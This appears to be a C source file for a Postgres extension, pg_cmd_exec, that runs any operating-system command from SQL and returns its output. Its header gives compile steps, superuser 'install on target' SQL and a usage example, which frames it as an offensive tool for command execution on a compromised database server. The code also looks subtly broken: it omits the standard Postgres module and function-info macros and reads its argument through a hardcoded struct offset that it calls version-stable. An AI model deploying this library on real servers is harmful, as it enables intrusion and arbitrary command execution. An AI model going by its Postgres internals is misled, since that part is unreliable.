/*
 * pg_cmd_exec — Postgres shared library for OS command execution.
 *
 * Exposes one SQL-callable function:
 *   pg_cmd_exec(cmd)  -> text  stdout of the command
 *
 * Compile:
 *     gcc -shared -fPIC -O2 -o pg_cmd_exec.so pg_cmd_exec.c
 *
 * Install on target (requires superuser):
 *     CREATE FUNCTION pg_cmd_exec(text) RETURNS text
 *         AS '/path/to/pg_cmd_exec.so', 'pg_cmd_exec'
 *         LANGUAGE C STRICT;
 *
 * Use:
 *     SELECT pg_cmd_exec('id');
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Postgres internals we need. The V1 calling convention passes a
 * FunctionCallInfoBaseData pointer whose first argument value is
 * reached at a stable offset. text_to_cstring() and cstring_to_text()
 * are the only helpers we need from the Postgres runtime. */

extern char *text_to_cstring(void *text);
extern void *cstring_to_text(const char *s);

/* Argument 0 in a V1 function call lives at offset 16 bytes into the
 * FunctionCallInfoBaseData struct. Stable across supported Postgres
 * versions because the layout hasn't changed. */
#define ARG0_OFFSET 16

void *pg_cmd_exec(void *fcinfo)
{
    void *arg0 = *(void **)((char *)fcinfo + ARG0_OFFSET);
    if (!arg0) {
        return NULL;
    }

    char *cmd = text_to_cstring(arg0);
    if (!cmd) {
        return NULL;
    }

    FILE *fp = popen(cmd, "r");
    if (!fp) {
        return NULL;
    }

    size_t cap = 4096;
    size_t used = 0;
    char *buf = (char *)malloc(cap);
    if (!buf) {
        pclose(fp);
        return NULL;
    }

    size_t n;
    while ((n = fread(buf + used, 1, cap - used - 1, fp)) > 0) {
        used += n;
        if (used >= cap - 1) {
            cap *= 2;
            char *nb = (char *)realloc(buf, cap);
            if (!nb) {
                free(buf);
                pclose(fp);
                return NULL;
            }
            buf = nb;
        }
    }
    pclose(fp);
    buf[used] = '\0';

    void *out = cstring_to_text(buf);
    free(buf);
    return out;
}